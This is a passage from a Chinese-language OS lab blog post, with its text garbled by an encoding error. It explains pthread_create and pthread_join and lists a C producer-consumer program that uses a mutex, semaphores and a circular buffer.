ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>è¿›ç¨‹</p><p><img src="/posts/3994810f/image-20211130090602101.png" alt="image-20211130090602101"></p><p><img src="/posts/3994810f/image-20211130090745719.png" alt="image-20211130090745719"></p><h3 id="çº¿ç¨‹å®ç°"><a class="markdownIt-Anchor" href="#çº¿ç¨‹å®ç°"></a> çº¿ç¨‹å®ç°</h3><h4 id="é¢„å¤‡çŸ¥è¯†-2"><a class="markdownIt-Anchor" href="#é¢„å¤‡çŸ¥è¯†-2"></a> é¢„å¤‡çŸ¥è¯†</h4><h5 id="pthread_create"><a class="markdownIt-Anchor" href="#pthread_create"></a> pthread_create</h5><p>pthread_createæ˜¯UNIXç¯å¢ƒåˆ›å»ºçº¿ç¨‹å‡½æ•°</p><p><strong>å¤´æ–‡ä»¶ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></div></td></tr></table></figure><p><strong>å‡½æ•°å£°æ˜ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_create</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> *<span class="hljs-keyword">restrict</span> tidp,<span class="hljs-keyword">const</span> <span class="hljs-keyword">pthread_attr_t</span> *restrict_attr,<span class="hljs-keyword">void</span>*ï¼ˆ*start_rtn)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span>,<span class="hljs-keyword">void</span> *<span class="hljs-keyword">restrict</span> arg)</span>;<br>å‚æ•°ï¼š<br></code></pre></div></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘çº¿ç¨‹æ ‡è¯†ç¬¦çš„æŒ‡é’ˆï¼Œå¯ç”¨å¦‚ä¸‹æ–¹å¼å®šä¹‰ pthread_t thread1;</li><li>ç¬¬äºŒä¸ªå‚æ•°ç”¨æ¥è®¾ç½®çº¿ç¨‹å±æ€§ã€‚</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯çº¿ç¨‹è¿è¡Œå‡½æ•°çš„åœ°å€ï¼Œå³å‡½æ•°åï¼Œå‡½æ•°å†…åŒ…æ‹¬å¾ªç¯ã€‚</li><li>æœ€åä¸€ä¸ªå‚æ•°æ˜¯è¿è¡Œå‡½æ•°çš„å‚æ•°ã€‚</li></ul><p><strong>è¿”å›å€¼ï¼š</strong></p><p>è‹¥æˆåŠŸåˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›å‡ºé”™ç¼–å·</p><p><strong>æ³¨æ„ï¼š</strong></p><p>åœ¨ç¼–è¯‘æ—¶æ³¨æ„åŠ ä¸Š-l pthreadå‚æ•°ï¼Œä»¥è°ƒç”¨é™æ€é“¾æ¥åº“ã€‚å› ä¸ºpthreadå¹¶éLinuxç³»ç»Ÿçš„é»˜è®¤åº“ã€‚</p><h5 id="pthread_join"><a class="markdownIt-Anchor" href="#pthread_join"></a> <strong>pthread_join</strong></h5><p><strong>å‡½æ•°ç®€ä»‹ï¼š</strong></p><p>å‡½æ•°pthread_joinç”¨æ¥ç­‰å¾…ä¸€ä¸ªçº¿ç¨‹çš„ç»“æŸã€‚pthread_join()å‡½æ•°ï¼Œä»¥é˜»å¡çš„æ–¹å¼ç­‰å¾…threadæŒ‡å®šçš„çº¿ç¨‹ç»“æŸã€‚å½“å‡½æ•°è¿”å›æ—¶ï¼Œè¢«ç­‰å¾…çº¿ç¨‹çš„èµ„æºè¢«æ”¶å›ã€‚å¦‚æœçº¿ç¨‹å·²ç»ç»“æŸï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¼šç«‹å³è¿”å›ã€‚å¹¶ä¸”threadæŒ‡å®šçš„çº¿ç¨‹å¿…é¡»æ˜¯joinableçš„ã€‚<br>ã€€ã€€<br><strong>å¤´æ–‡ä»¶ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></div></td></tr></table></figure><p><strong>å‡½æ•°å£°æ˜ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_join</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> thread, <span class="hljs-keyword">void</span> **retval)</span></span>;<br></code></pre></div></td></tr></table></figure><p><strong>å‚æ•°ï¼š</strong></p><ul><li><p>thread: çº¿ç¨‹æ ‡è¯†ç¬¦ï¼Œå³çº¿ç¨‹IDï¼Œæ ‡è¯†å”¯ä¸€çº¿ç¨‹ï¼Œä¸ºè¢«ç­‰å¾…çš„çº¿ç¨‹æ ‡è¯†ç¬¦ã€‚</p></li><li><p>retval: ç”¨æˆ·å®šä¹‰çš„æŒ‡é’ˆï¼Œç”¨æ¥å­˜å‚¨è¢«ç­‰å¾…çº¿ç¨‹çš„è¿”å›å€¼ã€‚</p></li></ul><p><strong>è¿”å›å€¼ï¼š</strong></p><p>å¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå°†è¿”å›0ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›ä¸€ä¸ªé”™è¯¯å·ã€‚</p><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"></a> <strong>æ•°æ®ç»“æ„</strong>å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//å·¥ä½œæ¬¡æ•°</span><br><span class="hljs-comment">//ä¸‰ä¸ªä¿¡å·é‡</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//çº¿ç¨‹é—´äº’æ–¥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//å¡«å……çš„ä¸ªæ•°</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//ç©ºæ§½çš„ä¸ªæ•°</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//ç¼“å†²åŒºé‡Œå­—æ¯æ•°é‡</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//ç¼“å†²åŒºç»“æ„ä½“</span><br><span class="hljs-comment">//struct my_buffer *buffer</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span><span class="hljs-comment">//å¾—åˆ°3ä»¥å†…çš„ä¸€ä¸ªéšæœºæ•°</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span><span class="hljs-comment">//å¾—åˆ°Aï½Zçš„ä¸€ä¸ªéšæœºå­—æ¯</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//æ‰“å°æ—¶é—´</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//ç”Ÿäº§è€…è¿›ç¨‹çš„ç”Ÿäº§å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//æ¶ˆè´¹è€…è¿›ç¨‹çš„ç”Ÿæ¶ˆè´¹å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//ç”Ÿäº§è€…çº¿ç¨‹</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//è‹¥ç©ºæ§½ä¸ªæ•°ä½äº0é˜»å¡</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//æ¶ˆè´¹è€…çº¿ç¨‹</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//è‹¥å¡«å……ä¸ªæ•°ä½äº0é˜»å¡</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç -2"><a class="markdownIt-Anchor" href="#æºä»£ç -2"></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//å·¥ä½œæ¬¡æ•°</span><br><span class="hljs-comment">//ä¸‰ä¸ªä¿¡å·é‡</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//çº¿ç¨‹é—´äº’æ–¥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//å¡«å……çš„ä¸ªæ•°</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//ç©ºæ§½çš„ä¸ªæ•°</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//ç¼“å†²åŒºé‡Œå­—æ¯æ•°é‡</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//ç¼“å†²åŒºç»“æ„ä½“</span><br><span class="hljs-comment">//struct my_buffer *buffer;</span><br><span class="hljs-comment">//å¾—åˆ°3ä»¥å†…çš„ä¸€ä¸ªéšæœºæ•°</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> digit;<br>    digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//å¾—åˆ°Aï½Zçš„ä¸€ä¸ªéšæœºå­—æ¯</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> letter;<br>    letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    <span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//æ‰“å°æ—¶é—´</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">time_t</span> now;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//å®ä¾‹åŒ–tmç»“æ„æŒ‡é’ˆ</span><br>    <span class="hljs-built_in">time</span>(&amp;now);<br>    timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//ç”Ÿäº§è€…è¿›ç¨‹çš„ç”Ÿäº§å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//ç¨‹åºè¿è¡Œæ—¶é—´</span><br>    <span class="hljs-comment">/*ç”Ÿäº§äº§å“*/</span><br>    <span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//éšæœºè·å–å­—æ¯</span><br>    buffer.str[buffer.in] = c;<br>    buffer.in = (buffer.in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//å†™å…¥æ–°äº§å“</span><br>    buffer.num++;<br>    <span class="hljs-comment">//æ‰“å°ç¼“å†²åŒº</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//æ§åˆ¶è¾“å‡ºæ ¼å¼</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//è¿›ç¨‹idä¿¡æ¯</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//è¿›ç¨‹æ“ä½œ</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//æ¶ˆè´¹è€…è¿›ç¨‹çš„ç”Ÿæ¶ˆè´¹å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//ç¨‹åºè¿è¡Œæ—¶é—´</span><br>    <span class="hljs-comment">/*ç”Ÿäº§äº§å“*/</span><br>    <span class="hljs-keyword">char</span> c = buffer.str[buffer.out];<br>    buffer.out = (buffer.out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = (buffer.out == buffer.in); <span class="hljs-comment">//</span><br>    buffer.num--;<br>    <span class="hljs-comment">//æ‰“å°ç¼“å†²åŒº</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//æ§åˆ¶è¾“å‡ºæ ¼å¼</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//è¿›ç¨‹idä¿¡æ¯</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, c); <span class="hljs-comment">//è¿›ç¨‹æ“ä½œ</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//è‹¥ç©ºæ§½ä¸ªæ•°ä½äº0é˜»å¡</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//è‹¥å¡«å……ä¸ªæ•°ä½äº0é˜»å¡</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//éšæœºåŒ–æ—¶é—´ç§å­</span><br><br>    <span class="hljs-keyword">pthread_t</span> thid1;<br>    <span class="hljs-keyword">pthread_t</span> thid2;<br>    <span class="hljs-keyword">pthread_t</span> thid3;<br>    <span class="hljs-keyword">pthread_t</span> thid4;<br><br>    <span class="hljs-keyword">int</span> ret1;<br>    <span class="hljs-keyword">int</span> ret2;<br>    <span class="hljs-keyword">int</span> ret3;<br>    <span class="hljs-keyword">int</span> ret4;<br>    <span class="hljs-comment">//åˆå§‹åŒ–ä¿¡å·é‡</span><br>    <span class="hljs-built_in">sem_init</span>(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;empty, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//çº¿ç¨‹id</span><br>    <span class="hljs-keyword">int</span> t1 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> t2 = <span class="hljs-number">2</span>;<br>    <span class="hljs-comment">//åˆå§‹åŒ–ç¼“å†²åŒº</span><br>    buffer.out = <span class="hljs-number">0</span>;<br>    buffer.in = <span class="hljs-number">0</span>;<br>    buffer.is_empty = <span class="hljs-number">1</span>;<br>    buffer.num = <span class="hljs-number">0</span>;<br><br>    <span 